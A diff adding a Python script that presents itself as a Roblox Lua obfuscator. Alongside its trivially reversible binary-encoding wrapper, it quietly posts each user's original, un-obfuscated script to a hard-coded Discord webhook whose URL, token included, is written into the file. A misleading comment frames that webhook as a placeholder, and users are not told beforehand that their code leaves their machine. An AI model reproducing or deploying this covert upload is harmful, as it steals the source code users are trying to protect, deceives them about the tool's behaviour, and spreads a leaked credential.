@@ -1,0 +1,119 @@
+import os
+import time
+import requests
+
+# Replace with your actual webhook URL
+WEBHOOK_URL = "https://discord.com/api/webhooks/1292646364190212177/lBDxu-NXEfL6tqAztbvf3ZYaLGaYmgMyah8WXsaVM0OgQ9xhbTlmHVhV_2c5bildMHb7"
+
+def log_to_discord(deobfuscated_script, obfuscated_script):
+    # Limit the length of the message to prevent exceeding Discord's character limit
+    MAX_LENGTH = 1900
+
+    if len(obfuscated_script) > MAX_LENGTH:
+        obfuscated_script = obfuscated_script[:MAX_LENGTH]
+    if len(deobfuscated_script) > MAX_LENGTH:
+        deobfuscated_script = deobfuscated_script[:MAX_LENGTH]
+
+    payload = {
+        "content": (
+            f"Deobfuscated Script:\n```lua\n{deobfuscated_script}\n```\n"
+            f"Obfuscated Script:\n```lua\n{obfuscated_script}\n```"
+        )
+    }
+    headers = {"Content-Type": "application/json"}
+
+    try:
+        response = requests.post(WEBHOOK_URL, json=payload, headers=headers)
+        if response.status_code == 204:
+            print("Logged to Discord successfully.")
+        else:
+            print(f"Failed to log to Discord: {response.status_code} - {response.text}")
+    except requests.exceptions.RequestException as e:
+        print(f"Error occurred while logging to Discord: {e}")
+
+def countdown(seconds):
+    for remaining in range(seconds, 0, -1):
+        print(f"Exiting in {remaining} seconds...", end="\r")
+        time.sleep(1)
+    print("Exiting.")
+
+def Encode(text):
+    text = str(text)
+    encoded_list = []
+    
+    for char in text:
+        key = ord(char)
+        encoded_bits = ''.join(str((key >> bit) & 1) for bit in range(7, -1, -1))
+        encoded_list.append(encoded_bits)
+    
+    return "','".join(encoded_list)
+
+def obfuscate_lua_script(script_to_obfuscate):
+    start_time = time.time()
+
+    # Encode the script using the Encode function
+    encoded_script = Encode(script_to_obfuscate)
+    obfuscated_script = f"""
+local BinaryEncrypted = table.concat({{{encoded_script}}})
+function decode(str)
+    local function binary_to_string(bin)
+        return string.char(tonumber(bin, 2))
+    end
+    return (str:gsub("([01]{{8}})", binary_to_string))
+end
+local Binary = BinaryEncrypted
+_G.EncodedBinary = decode(Binary)
+loadstring(_G.EncodedBinary)()
+"""
+
+    # Adding watermark
+    obfuscated_script = "-- Watermark: This obfuscator has been created by Demon Hub Community.\n" + obfuscated_script
+
+    print(obfuscated_script)
+    
+    # Log both versions to Discord
+    log_to_discord(script_to_obfuscate, obfuscated_script)
+
+    # Calculate the time taken
+    elapsed_time = time.time() - start_time
+    print(f"Time taken to obfuscate script: {elapsed_time:.2f} seconds")
+    
+    return obfuscated_script
+
+def main():
+    print("Obfuscator made by Demon Hub Community | https://discord.gg/J7AYrApFAH")
+    
+    input_file = input("Drag any txt file here to obfuscate your Roblox script: ").strip().strip('"')
+
+    if not os.path.isfile(input_file):
+        print("Input file does not exist. Please check the path and try again.")
+        return
+
+    file_name = os.path.splitext(os.path.basename(input_file))[0]
+    output_file = f"{file_name}_obfuscated.lua"
+
+    choice = input("Do you want to obfuscate the script? (Yes/No): ").strip().lower()
+
+    if choice == 'yes':
+        try:
+            with open(input_file, 'r') as file:
+                script_to_obfuscate = file.read()
+
+            obfuscated_script = obfuscate_lua_script(script_to_obfuscate)
+
+            with open(output_file, 'w') as file:
+                file.write(obfuscated_script)
+
+            print(f"Obfuscated script saved to {output_file}")
+
+        except Exception as e:
+            print(f"An error occurred while processing the file: {e}")
+
+    elif choice == 'no':
+        countdown(3)
+    else:
+        print("Invalid choice. Exiting.")
+        countdown(3)
+
+if __name__ == "__main__":
+    main()
